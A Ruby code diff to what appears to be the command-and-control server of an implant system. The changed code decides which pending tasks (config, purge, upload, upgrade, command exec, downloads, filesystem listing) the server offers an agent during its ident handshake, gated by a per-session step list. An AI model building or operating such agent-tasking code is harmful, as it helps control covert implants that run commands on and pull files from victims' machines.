@@ -80,41 +80,44 @@ module Commands
     # response to the request
     command = [PROTO_OK].pack('I')
 
-    # the time of the server to synchronize the clocks
-    time = [now].pack('Q')
-    
+    steps = DB.instance.agent_availables(session).map(&:to_sym)
+    trace :debug, "[#{peer}][#{session[:cookie]}] Steps to be performed during ident: #{steps.inspect}"
+
     available = ""
     # ask to the db if there are any availables for the agent
     # the results are actually downloaded and saved locally
     # we will retrieve the content when the agent ask for them later
-    if DB.instance.new_conf? session[:bid]
+    if steps.include? :config and DB.instance.new_conf? session[:bid]
       available += [PROTO_CONF].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New config"
     end
-    if DB.instance.purge? session[:bid]
+    if steps.include? :purge and DB.instance.purge? session[:bid]
       available += [PROTO_PURGE].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: Purge"
     end
-    if DB.instance.new_uploads? session[:bid]
+    if steps.include? :upload and DB.instance.new_uploads? session[:bid]
       available += [PROTO_UPLOAD].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New uploads"
     end
-    if DB.instance.new_upgrade? session[:bid]
+    if steps.include? :upgrade and DB.instance.new_upgrade? session[:bid]
       available += [PROTO_UPGRADE].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New upgrade"
     end
-    if DB.instance.new_exec? session[:bid]
+    if steps.include? :exec and DB.instance.new_exec? session[:bid]
       available += [PROTO_EXEC].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New commands exec"
     end
-    if DB.instance.new_downloads? session[:bid]
+    if steps.include? :download and DB.instance.new_downloads? session[:bid]
       available += [PROTO_DOWNLOAD].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New downloads"
     end
-    if DB.instance.new_filesystems? session[:bid]
+    if steps.include? :filesystem and DB.instance.new_filesystems? session[:bid]
       available += [PROTO_FILESYSTEM].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New filesystems"
     end
+
+    # the time of the server to synchronize the clocks
+    time = [Time.now.getutc.to_i].pack('Q')
 
     # calculate the total size of the response
     tot = time.length + 4 + available.length
